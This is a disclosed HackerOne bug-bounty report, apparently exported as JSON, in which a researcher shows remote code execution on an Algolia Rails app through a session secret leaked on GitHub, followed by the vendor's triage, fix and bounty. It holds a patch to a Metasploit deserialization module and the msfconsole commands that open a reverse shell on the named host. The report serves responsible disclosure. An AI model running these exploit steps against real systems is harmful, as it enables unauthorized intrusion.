{"id":134321,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzQzMjE=","url":"https://hackerone.com/reports/134321","title":"RCE on facebooksearch.algolia.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-25T05:47:36.506Z","submitted_at":"2016-04-25T05:47:36.506Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"michiel","url":"/michiel","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":443,"url":"https://hackerone.com/algolia","handle":"algolia","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Algolia","twitter_handle":"algolia","website":"https://algolia.com","about":"Hosted search API that delivers instant and relevant results from the first keystroke"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-10-01T15:24:10.322Z","bug_reporter_agreed_on_going_public_at":"2016-09-01T15:23:52.927Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a **public** GitHub repository. Since the Rails app running at `facebooksearch.algolia.com` is using `CookieStore` as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.\n\nCookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: https://charlie.bz/blog/rails-3.2.10-remote-code-execution. \n\n# Where did I find the session secret?\nI used [Gitrob](https://github.com/michenriksen/gitrob) to scan all of Algolia's public repositories (plus repositories from employees) and extract everything that is interesting. The `secret_token.rb` initializer immediately caught my attention since it usually contains the `secret_key_base`, which should never be public. \n\nThe token can be found here: https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12\n\n# Proof of Concept\n@joernchen developed a ready to go proof of concept for this vulnerability and submitted it to the [Metasploit Framework](http://www.darkoperator.com/installing-metasploit-in-ubunt/): https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb\n\nSince the version of the exploit doesn't take cookies with `-` into account, here is a small patch to allow the exploit to work on the `_facebook-search_session` cookie. Here's the patch for the exploit: \n\n```diff\n     if res \u0026\u0026 !res.get_cookies.empty?\n-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n+      match = res.get_cookies.match(/([_A-Za-z0-9\\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n     end\n```\n\nWith that patch applied, you can run the PoC from `msfconsole` by following these commands:\n\n```bash\n# setting up\nuse exploit/multi/http/rails_secret_deserialization\nset secret \"\u003cgrab-from-github-url\u003e\"\nset rhost facebooksearch.algolia.com\nset railsversion 4\nset targeturi /auth/facebook\n\n# and then run\nexploit\n\n# when successful, a reverse shell will be established\n# this allows you to run arbitrary commands\n```\n\nAs a proof of concept, I ran `id`:\n\n```\nid\nuid=1000(prod) gid=1000(prod) groups=1000(prod)\n```\n\nBut since that is very generic, I also created http://facebooksearch.algolia.com/hackerone.txt with the text \"PoC by michiel\" to proof regular write access is possible as well. \n\n# Remediation\nSwitch `config/initializers/secret_token.rb` to use an environment variable (e.g. `ENV['SECRET_KEY_BASE']`). You must also generate a new token because the current secret is compromised. A new secret can be generated by running `rake secret` from the command line. Make sure the new secret does not leak in git commit history. \n\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-10-01T15:23:53.070Z","allow_singular_disclosure_after":-158624091.2099926,"singular_disclosure_allowed":true,"vote_count":69,"voters":["zzero","derision","hunter","michiel","bogdantcaciuc","dawgyg","sameerphad72","spam404","yaworsk","koenrh","and 59 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":925512,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I now realize the file I created - http://facebooksearch.algolia.com/hackerone.txt - is gone again. Maybe there are multiple app servers and I created the file on only one app server? (Look in `public/` for a file called `hackerone.txt`.)","automated_response":false,"created_at":"2016-04-25T05:57:18.176Z","updated_at":"2016-04-25T05:57:18.176Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":925515,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the report. We investigate.","automated_response":false,"created_at":"2016-04-25T05:59:06.517Z","updated_at":"2016-04-25T05:59:06.517Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":925534,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The linked blog is dead. Here's a similar post explaining the concept: http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/. \n\nLet me know if you need anything else. ","automated_response":false,"created_at":"2016-04-25T06:36:34.241Z","updated_at":"2016-04-25T06:36:34.241Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":925551,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the update @michiel","automated_response":false,"created_at":"2016-04-25T06:52:52.044Z","updated_at":"2016-04-25T06:52:52.044Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":925555,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I confirm the file is present. Since there are multiple servers running the app, the request might not show it every time.","automated_response":false,"created_at":"2016-04-25T06:59:08.517Z","updated_at":"2016-04-25T06:59:08.517Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":926385,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I noticed you took down the website temporarily as a precaution. Good!","automated_response":false,"created_at":"2016-04-25T16:23:35.208Z","updated_at":"2016-04-25T16:23:35.208Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":927807,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, it was an old application that we did not maintain anymore and it turned out to be the weak spot.","automated_response":false,"created_at":"2016-04-26T07:31:20.881Z","updated_at":"2016-04-26T07:31:20.881Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":933377,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"After a discussion with the dev team, it has been decided that the application will stay down. We have checked all our other Rails applications and those are safe. Thank you for your help, it's much appreciated.","automated_response":false,"created_at":"2016-04-29T10:25:25.766Z","updated_at":"2016-04-29T10:25:25.766Z","actor":{"username":"adams","cleared":false,"url":"/adams","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/053/f25684e04947d3756222aa2b2b7e43b62b4dfe96_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"michiel","url":"/michiel"},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":933730,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for addressing the problem so fast! Is this in scope for the bounty program?","automated_response":false,"created_at":"2016-04-29T15:19:37.790Z","updated_at":"2016-04-29T15:19:37.790Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":933745,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Yes. Although the bug is out of scope of our program, we have decided to award a bounty. Thank you for your help!","automated_response":false,"created_at":"2016-04-29T15:27:55.242Z","updated_at":"2016-04-29T15:27:55.242Z","actor":{"url":"/algolia","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Algolia"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"algolia","collaborator":{"username":"michiel","url":"/michiel"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1167690,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since you guys handled this report so well and fast, I'd like to disclose this report and show how well the @algolia team handles vuln reports. Do you mind public disclosure? ","automated_response":false,"created_at":"2016-09-01T15:23:52.989Z","updated_at":"2016-09-01T15:23:52.989Z","first_to_agree":true,"actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1227464,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-10-01T15:24:10.343Z","updated_at":"2016-10-01T15:24:10.343Z","actor":{"url":"/algolia","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/443/6dc48cd913e21beebc873e81aaf28fd3b6b9e12e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Algolia"}},"genius_execution_id":null,"team_handle":"algolia","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}